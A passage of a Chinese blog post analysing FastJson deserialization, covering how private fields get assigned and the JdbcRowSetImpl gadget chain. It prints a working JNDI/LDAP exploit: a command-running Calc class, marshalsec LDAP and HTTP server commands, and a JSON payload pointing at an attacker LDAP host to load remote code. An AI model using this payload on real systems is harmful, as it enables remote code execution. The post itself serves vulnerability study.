+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key1;</span><br><span class="line">    <span class="keyword">private</span> String key2;</span><br><span class="line">    <span class="keyword">private</span> String _key3;</span><br><span class="line">    <span class="keyword">public</span> String _key4;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setKey1</span><span class="params">(String key1)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setKey2</span><span class="params">(String key2)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setKey2&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user4</span><span class="params">(String key1,String key2)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.key1 = key1;</span><br><span class="line">        <span class="keyword">this</span>.key2 = key2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;key1=&#x27;&quot;</span> + key1 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key2=&#x27;&quot;</span> + key2 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key3=&#x27;&quot;</span> + _key3 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, key4=&#x27;&quot;</span> + _key4 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后是poc代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test13</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user4\&quot;,\&quot;key1\&quot;:\&quot;key11\&quot;,\&quot;key2\&quot;:\&quot;key22\&quot;,\&quot;_key3\&quot;:\&quot;key33\&quot;,\&quot;_key4\&quot;:\&quot;key44\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line"><span class="comment">//        Object P1 = JSON.parse(p1,Feature.SupportNonPublicField);</span></span><br><span class="line">        Object P1 = JSON.parse(p1);</span><br><span class="line">        System.out.println(<span class="string">&quot;===&gt; &quot;</span>+P1.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20240312155625896.png" alt="image-20240312155625896"><img src="image-20240312155647214.png" alt="image-20240312155647214"></p>
+<p>在user4里面，有四个变量key1，key2，key3，key4，其中key1，key2和key3都是私有变量(private)，但是key1和key2有setter类方法，key3则没有，而key4是公共变量(public)。所以在没有设置<code>Feature.SupportNonPublicField</code>时，totring()返回结果为<code>===&gt; user&#123;key1=&#39;key11&#39;, key2=&#39;key22&#39;, key3=&#39;null&#39;, key4=&#39;key44&#39;&#125;</code>。其中key3无法被赋值，为null。</p>
+<p>而在设置了Feature.SupportNonPublicField后，key3就赋值成功了。</p>
+<p>具体流程分析</p>
+<p>在经过一次次回溯后，找到JavaBeanDeserializer.java#parseField()中。</p>
+<p><img src="image-20240312162041859.png" alt="image-20240312162041859"></p>
+<p><img src="image-20240312162149768.png" alt="image-20240312162149768"></p>
+<p>当没有设置<code>Feature.SupportNonPublicField</code>时，fieldDeserializer为null，在经过<code>parser.parseExtra(object, key)</code>后就结束了（如上图），而在设置了<code>Feature.SupportNonPublicField</code>后，ieldDeserializer不为null，代码就会走到下面的<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues)</code>中，在这里面通过`setValue(object, value) –&gt; field.set(object, value)将_key3通过反射进行赋值，</p>
+<p><img src="image-20240312162458479.png" alt="image-20240312162458479"></p>
+<p><img src="image-20240312170154792.png" alt="image-20240312170154792"></p>
+<p>现在来看一下fieldDeserializer是如何被<code>Feature.SupportNonPublicField</code>影响的。</p>
+<p>定义：没有区别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FieldDeserializer fieldDeserializer &#x3D; smartMatch(key);</span><br></pre></td></tr></table></figure>
+
+<p>赋值：</p>
+<p>这是设置了<code>Feature.SupportNonPublicField</code>的。如果没设置这个特性，直接走不到这个地方。</p>
+<p><img src="image-20240312171414009.png" alt="image-20240312171414009"></p>
+<p>代码会在这个判断中返回false，自然就无法在里面为fieldDeserializer赋值</p>
+<p><img src="image-20240312171803481.png" alt="image-20240312171803481"></p>
+<p>这个判断里，fieldDeserializer == null默认为true，此时没有设置特性，所以后面两个都是false，当设置了特性后，<code>parser.lexer.isEnabled(mask) </code>的结果就为true了，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fieldDeserializer &#x3D;&#x3D; null &amp;&amp; </span><br><span class="line">(  </span><br><span class="line">   parser.lexer.isEnabled(mask)  || </span><br><span class="line">   (this.beanInfo.parserFeatures &amp; mask) !&#x3D; 0)</span><br><span class="line">) </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>环境</p>
+<ul>
+<li>ubuntu 22.04</li>
+<li>java version “1.8.0_102”</li>
+<li>marshalsec-0.0.3-SNAPSHOT-all.jar （sha1 22f311752a1c6ce1102bcb199458c8d10118ae6e）</li>
+</ul>
+<p>poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;gnome-calculator&quot;</span>&#125;;<span class="comment">//win的目标可以换成calc</span></span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javac Calc.java生成Calc.class后，使用python起一个web服务。</p>
+<ul>
+<li>sudo python3 -m http.server 8888</li>
+</ul>
+<p>然后使用marshalsec-0.0.3-SNAPSHOT-all.jar起一个LDAP服务</p>
+<ul>
+<li>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a class="link" target="_blank" rel="noopener" href="http://0.0.0.0:8888/#Calc&quot;">http://0.0.0.0:8888/#Calc&quot;<i class="fas fa-external-link-alt"></i></a> 9999</li>
+</ul>
+<p>再然后idea里的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test11</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String cmd = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.56.213:9999/calc\&quot;,  \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    Object P2 = JSON.parseObject(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20240307142526862.png" alt="image-20240307142526862"></p>
+<p>流程分析：</p>
+<p>在com.sun.rowset.JdbcRowSetImpl类中，有一个setAutoCommit类，完全符合fastjson自动调用的setter方法的条件：长度大于4、非静态、void返回、set后的字母大写、参数为1。需要payload中有”autoCommit&quot;:true。设置为true，是为了让这个函数能执行this.connect()。这个connect()才是执行命令的关键</p>
+<p><img src="image-20240307145501023.png" alt="image-20240307145501023"></p>
+<p>ctrl+左键进入connect()内，可以看到危险代码(DataSource)var1.lookup(this.getDataSourceName());关键是这个<code>lookup()</code>,目标在进行<code>lookup()</code>操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；</p>
+<p><img src="image-20240307150004307.png" alt="image-20240307150004307"></p>
+<h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><p>之前的流程相同，在检测到DEFAULT_TYPE_KEY(@type)后，多了这一行判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231101161912921.png" alt="image-20231101161912921"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link" target="_blank" rel="noopener" href="https://tttang.com/archive/1579/#toc__2">https://tttang.com/archive/1579/#toc__2<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bD4y117Qh/">https://www.bilibili.com/video/BV1bD4y117Qh/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14601670.html">https://www.cnblogs.com/nice0e3/p/14601670.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240446#h3-6">https://www.anquanke.com/post/id/240446#h3-6<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://javasec.org/java-vuls/FastJson.html">https://javasec.org/java-vuls/FastJson.html<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2023/10/27/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-y-acer-2/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">FastJson反序列化分析笔记</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/08/15/Ubuntu-Javafx%E8%87%AA%E5%AE%9A%E4%B9%89/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Ubuntu-Javafx自定义</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
+                    appKey: 'itjAi31G55tfhpSKJiuLDe2g',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '生命是上天的馈赠，我不想虚度年华',
+                    lang: 'cn'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'This_is_Y';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('true') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%80%A7"><span class="nav-number">1.</span> <span class="nav-text">两个特性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%8F%AF%E6%8E%A7%E5%88%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.1.</span> <span class="nav-text">用户可控制反序列化的对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">安全的使用方法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">1.1.2.</span> <span class="nav-text">不安全的使用方法：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8getName%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">调用getName方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">调用流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">正常流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%86%E5%88%AB-type"><span class="nav-number">2.1.1.</span> <span class="nav-text">识别@type</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%B1%BB"><span class="nav-number">2.1.2.</span> <span class="nav-text">加载指定类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getonly%E5%8F%82%E6%95%B0"><span class="nav-number">2.1.3.</span> <span class="nav-text">getonly参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.4.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">2.1.5.</span> <span class="nav-text">测试执行命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">2.2.</span> <span class="nav-text">寻找利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl"><span class="nav-number">2.2.1.</span> <span class="nav-text">TemplatesImpl</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bytecodes%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%E7%9A%84%E8%B5%8B%E5%80%BC"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">_bytecodes私有属性的赋值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-number">2.2.2.</span> <span class="nav-text">JdbcRowSetImpl</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-25"><span class="nav-number">2.3.</span> <span class="nav-text">1.2.25</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
